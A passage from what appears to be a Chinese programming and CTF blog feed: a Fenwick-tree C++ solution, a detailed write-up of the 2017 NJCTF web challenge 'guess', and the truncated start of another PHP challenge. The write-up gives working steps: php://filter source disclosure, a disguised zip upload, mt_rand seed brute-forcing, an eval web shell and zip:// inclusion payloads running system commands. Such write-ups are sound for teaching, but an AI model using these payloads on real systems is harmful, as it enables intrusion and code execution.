class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">4e4</span>;  <span class="comment">// 注意此处</span></span><br><span class="line"><span class="keyword">int</span> arr[N] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans[N/<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;, n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x &amp; (-x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; N) &#123;  <span class="comment">// 注意是 N</span></span><br><span class="line">        arr[i] += v;</span><br><span class="line">        i += lowbit(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(x) &#123;</span><br><span class="line">        res += arr[x];</span><br><span class="line">        x -= lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> x, y; <span class="built_in">cin</span>&gt;&gt;x&gt;&gt;y;</span><br><span class="line">        ans[Sum(++x)]++;  <span class="comment">// x 要加一</span></span><br><span class="line">        add(x, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans[i]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://poj.org/problem?id=2352&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原题链接&lt;/a&gt;&lt;br&gt; &lt;strong&gt;题目大意&lt;/strong&gt;&lt;br&gt;  给出一些星星的二维坐标，求星星左方，下方，左下方的
      
    
    </summary>
    
    
      <category term="算法" scheme="https://wywwzjj.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>2017 NJCTF web guess</title>
    <link href="https://wywwzjj.top/2018/12/30/NJCTF-guess/"/>
    <id>https://wywwzjj.top/2018/12/30/NJCTF-guess/</id>
    <published>2018-12-30T04:54:58.000Z</published>
    <updated>2019-02-28T09:02:45.870Z</updated>
    
    <content type="html"><![CDATA[<p>粗一看，是文件上传的题目。随便传一个文件试试，测试可知，只是验证后缀，改后缀即可绕过。</p><p>问题是文件传到哪里去了，这也是本题的核心考点。</p><p><a href="http://111.198.29.45:30117/?page=upload" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=upload</a></p><p>url 有所变化，可能任意跳转，尝试下伪协议读源码，成功。</p><p><a href="http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">        $page=$_GET[<span class="string">'page'</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $page=<span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>,$page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">        &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($page) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="keyword">include</span>($page.<span class="string">'.php'</span>))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">        &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"</span>;</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php 没太多用处，核心在 upload.php。</p><p><a href="http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</span><br><span class="line">$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line"><span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line"><span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line"><span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line"><span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">$ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">$str .= $set[$ch];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);  <span class="comment">// 生成随机数做种子</span></span><br><span class="line">mt_srand($seed);  <span class="comment">// 用seed给随机数发生器播种</span></span><br><span class="line">$ss = mt_rand();  <span class="comment">// 取随机数</span></span><br><span class="line"></span><br><span class="line">        $hash = md5(session_id() . $ss);  <span class="comment">// session_id() 是可控的，设为 0 或者很短的值</span></span><br><span class="line">        <span class="comment">// 服务端对 session_id() 的态度：你有用你的，你没有我给你设。</span></span><br><span class="line"></span><br><span class="line">        setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line"><span class="comment">// 此处是设置 SESSION </span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$check2 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">$check3 = !preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($check3) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line"><span class="keyword">if</span> ($check2) &#123;</span><br><span class="line">$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>\$filename = ‘./uP1O4Ds/‘ . random_str() . ‘_’ . $_FILES[‘file-upload-field’][‘name’];</p></blockquote><p>由此可知，重点是预测 random_str() 的值。</p><p>联想到此前的 2018 SWPUCTF 用优惠码买个X？<a href="https://www.anquanke.com/post/id/168308" target="_blank" rel="noopener">SWPUCTF wp</a></p><p>因此我们只要得到 mt_srand() 函数的播种种子的值，就可以预测出24位的优惠码。</p><blockquote><p>测试发现无论是rand()函数还是mt_rand()函数,当随机数种子相同的时候,无论运行多少次,产生的随机数序列都是一样的,所以如果我们在代码中自己播种了随机数种子,但是泄露了这个种子,就会导致产生的随机数序列被别人猜到,造成安全问题.</p></blockquote><p>对于这个题也类似，只要得到种子，就能预测。</p><p><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">php的随机数的安全性分析</a></p><p><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">大牛的爆破种子神器</a></p><p>直接强行爆破太麻烦了，先爆出一个随机数，利用这个随机数去爆破它的种子。</p><p>将 test.php 文件打个压缩包 test.zip，然后改后缀名 test.png，利用 zip:// 解压缩读取</p><p><a href="http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()" target="_blank" rel="noopener">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=phpinfo()</a>;</p><p>种子确定了，随机值也确定了，直接利用源代码中的方式就能推出路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$std = <span class="string">"6f51b1f6ba8ee543732b21dbe0efacb9"</span>;  <span class="comment">// cookie 中的 SESSION</span></span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">999999999</span>;$i++) &#123;</span><br><span class="line">        $ha = md5(<span class="string">"0"</span> . $i);</span><br><span class="line">        <span class="keyword">if</span>($ha === $std) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Success-----------=&gt;"</span> . $i;</span><br><span class="line">            <span class="comment">// 爆出随机数为 i</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($i % <span class="number">100000000</span> == <span class="number">0</span>) <span class="keyword">echo</span> $i . <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得出随机数</p><p><img src="https://i.loli.net/2018/12/30/5c28b5e0bea95.png" alt="屏幕捕获_2018_12_30_19_58_38_361.png"></p><p>然后利用神器，爆出种子</p><p><img src="https://i.loli.net/2018/12/30/5c28b5e1033b1.png" alt="屏幕捕获_2018_12_30_20_10_40_322.png"></p><p>利用这个脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爆出来的种子</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="number">76047661</span>,<span class="number">1136899518</span>,<span class="number">1497431590</span>,<span class="number">2832522619</span>);  </span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> $a) &#123;</span><br><span class="line">    mt_srand($a);</span><br><span class="line">    $set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line">                 <span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line">                 <span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line">                 <span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">                 <span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">    $str = <span class="string">''</span>;</span><br><span class="line">    $ss = mt_rand();  <span class="comment">// 这一步必须加上，否则与服务器端的随机值对应不上</span></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= <span class="number">32</span>; ++$i) &#123;</span><br><span class="line">        $ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">        $str .= $set[$ch];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// echo 'zip://uP1O4Ds/' . $str . '_test.png%23test&amp;a=phpinfo();' . "&lt;br&gt;";</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'http://111.198.29.45:30117/uP1O4Ds/'</span> . $str . <span class="string">'_test.png'</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先检查地址是否有效，然后利用之前传的后门进行命令执行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后的 payload 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:30117/?page=zip://uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> test.png%23test&amp;a=<span class="built_in">echo</span>%20system(%27ls%27); 这样是不行的，网上都是这个路子==，找时间整理下</span></span><br><span class="line"></span><br><span class="line">CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br></pre></td></tr></table></figure><p>然后 cat flag</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">111.198</span>.<span class="number">29.45</span>:<span class="number">30117</span>/?page=zip://uP<span class="number">1</span>O<span class="number">4</span>Ds/Ah<span class="number">86</span>F<span class="number">1</span>AZxgsLc<span class="number">8</span>UUjkHPZRKMoCM<span class="number">3</span>XUdT_test.png<span class="symbol">%23</span>test/test&amp;a=echo<span class="symbol">%20</span>system(<span class="symbol">%27</span>cat<span class="symbol">%20</span>./flag-Ed<span class="keyword">i98</span>vJF<span class="number">8</span>hnIp.txt<span class="symbol">%27</span>)<span class="comment">;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125; xctf&#123;3fbbe15371c9cd42ec1a698d7660849a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;粗一看，是文件上传的题目。随便传一个文件试试，测试可知，只是验证后缀，改后缀即可绕过。&lt;/p&gt;
&lt;p&gt;问题是文件传到哪里去了，这也是本题的核心考点。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://111.198.29.45:30117/?page=upload&quot; targe
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="php 伪随机数" scheme="https://wywwzjj.top/tags/php-%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>Please don&#39;t stop rua 233333</title>
    <link href="https://wywwzjj.top/2018/12/08/Please-don&#39;t-stop-rua-233333/"/>
    <id>https://wywwzjj.top/2018/12/08/Please-don&#39;t-stop-rua-233333/</id>
    <published>2018-12-08T10:09:27.000Z</published>
    <updated>2019-02-28T09:02:33.988Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://123.206.31.85:10012/" target="_blank" rel="noopener">原题网址</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = xxxxx;</span><br><span class="line"><span class="keyword">public</span> $truepassword = xxxxx;</span><br><span class="line"><span class="keyword">public</span> $time;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">construct</span><span class="params">($tt, $pp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;time = $tt;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $pp;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;password)) &#123;</span><br><span class="line"><span class="keyword">if</span>(strcmp(<span class="keyword">$this</span>-&gt;password,<span class="keyword">$this</span>-&gt;truepassword)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="keyword">$this</span>-&gt;time))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Sorry.&lt;br&gt;'</span>;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &lt; <span class="number">11</span> * <span class="number">22</span> * <span class="number">33</span> * <span class="number">44</span> * <span class="number">55</span> * <span class="number">66</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you need a bigger time.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;time &gt; <span class="number">66</span> * <span class="number">55</span> * <span class="number">44</span> * <span class="number">33</span> * <span class="number">23</span> * <span class="number">11</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'you need a smaller time.&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">sleep((int)<span class="keyword">$this</span>-&gt;time);</span><br><span class="line">var_dump(<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;you have no time!!!!!&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;h1&gt;Password is wrong............&lt;/h1&gt;&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h1&gt;Please input 